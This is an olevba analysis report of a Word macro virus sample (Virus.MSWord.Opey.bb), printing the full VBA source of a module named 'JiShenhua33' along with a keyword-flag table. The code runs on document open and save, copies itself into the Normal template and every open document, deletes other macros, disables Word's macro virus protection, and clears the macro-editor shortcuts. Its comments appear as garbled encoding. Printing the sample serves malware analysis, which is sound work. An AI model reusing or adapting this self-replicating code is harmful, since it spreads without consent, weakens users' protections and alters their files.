olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bb-ce1c195f5ee37a103057f8c63505f4eb02c5311d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bb-ce1c195f5ee37a103057f8c63505f4eb02c5311d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua33.bas 
in file: Virus.MSWord.Opey.bb-ce1c195f5ee37a103057f8c63505f4eb02c5311d - OLE stream: 'Macros/VBA/JiShenhua33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' іМРтЙијЖ: јЅЙч»Є  ЅЁРРЙЅ¶«КЎ·ЦРР
' ИХЖЪ: 2001Дк3ФВ
' №¦ДЬ: ёГіМРт°СWORDІЛµҐУл№¤ѕЯМхіхКј»ЇµЅФ­АґЧґМ¬ІўЙѕіэ±ѕДЈїйТФНвµДєкДЈїй.
'-------------------------------------------------------------------------------------
Const CurrentVersion = 33 '°ж±ѕєЕ
Const myName = "JiShenhua33" '±ѕіМРтГы
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Function IsNewDoc(myDoc As Document) As Boolean
    Dim rightPart As String
    If (Left(myDoc.Name, 2) = "ОДµµ") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 2)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    ElseIf (Left(myDoc.Name, 3) = "Doc") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 3)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    Else
        IsNewDoc = False
    End If
End Function
Function Immunize()
On Error Resume Next
    
    Dim ModuleName$, OpenDocImmunized As Boolean
    Dim i%, J%, NmImmunized As Boolean
    Dim myInt As Integer
    Dim openDoc As Document
    
    NmImmunized = False
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        ModuleName = NormalTemplate.VBProject.VBComponents(i).Name
        Select Case ModuleName
        Case "ThisDocument"
            myInt = NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
            If myInt > 0 Then
                NormalTemplate.VBProject.VBComponents(i).CodeModule.DeleteLines 1, myInt
            End If
        Case "MyTools"
        Case "VirusReport", "JiShenhua" 'ѕЙ°ж±ѕЙ±ІЎ¶ѕіМРт
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, _
                Name:=ModuleName, _
                Object:=wdOrganizerObjectProjectItems
        Case Else
            If Left(ModuleName, 9) = "JiShenhua" Then '±ѕіМРт
                myInt = Val(Right(ModuleName, 2))
                If myInt < CurrentVersion Then 'µ±З°іМРтµДѕЙ°ж±ѕ
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Else
                    NmImmunized = True 'КЗµ±З°°ж±ѕ»тёьёЯ°ж±ѕіМРт
                End If
            Else 'ЖдЛыіМРт
                msg = "ДгµД Word ПµНіЦРёЅґшУРєкіМРтДЈїй " + ModuleName + _
                    ", ј«УРїЙДЬКЗєкІЎ¶ѕ,ЗлСЎФс 'КЗ' ЗеіэёГІЎ¶ѕ."
                If MsgBox(msg, vbYesNo, "јЅЙч»ЄПтДъ±Ёёж:") = vbYes Then
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            End If
        End Select
    Next i
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
            ModuleName = openDoc.VBProject.VBComponents(J).Name
            Select Case ModuleName
                Case "ThisDocument"
                    myInt = openDoc.VBProject.VBComponents(J).CodeModule.CountOfLines
                    If myInt > 0 Then
                        openDoc.VBProject.VBComponents(J).CodeModule.DeleteLines 1, myInt
                    End If
                Case "Reference to Normal", "MyTools"
                Case "VirusReport", "JiShenhua" 'ѕЙ°ж±ѕЙ±ІЎ¶ѕіМРт
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Case Else
                    If Left(ModuleName, 9) = "JiShenhua" Then '±ѕіМРт
                        myInt = Val(Right(ModuleName, 2))
                        If myInt < CurrentVersion Then 'µ±З°іМРтµДѕЙ°ж±ѕ
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        Else
                            OpenDocImmunized = True 'КЗµ±З°°ж±ѕ»тёьёЯ°ж±ѕіМРт
                        End If
                    Else 'УРЖдЛыДЈїйґжФЪ
                        msg = "ДъµДОДјю <" + openDoc.Name + "> ЦРёЅґшУР Word єкДЈїй " + ModuleName + _
                            ", ј«УРїЙДЬКЗєкІЎ¶ѕ,ЗлСЎФс 'КЗ' ЗеіэёГІЎ¶ѕ."
                        If MsgBox(msg, vbYesNo, "јЅЙч»ЄПтДъ±Ёёж:") = vbYes Then
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        End If
                    End If
            End Select
        Next J
        'ПтґтїЄµДОДµµЦРРґИл±ѕіМРт
        If Not OpenDocImmunized Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, Name:=myName, _
                Object:=wdOrganizerObjectProjectItems
            If (Not IsNewDoc(openDoc)) And (Not openDoc.Saved) Then
                openDoc.Save
            End If
        End If
    Next openDoc
    'ПтNormalЦРРґИл±ѕіМРт
    If Not NmImmunized Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=myName, _
            Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.Saved Then NormalTemplate.Save
    End If
End Function
Function Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros False
   
    With Application
        .UserAddress = "јЅЙч»ЄТСОЄДъµД»ъЖч°ІЧ°БЛ·ґєкІЎ¶ѕіМРт(v33),КВЗ°ОґХчЗуДъµДН¬Тв,ЗлјыБВ."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "ёГОДјюёЅґшУРјЅЙч»Є±аРґµД·ґєкІЎ¶ѕіМРт(v33)."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

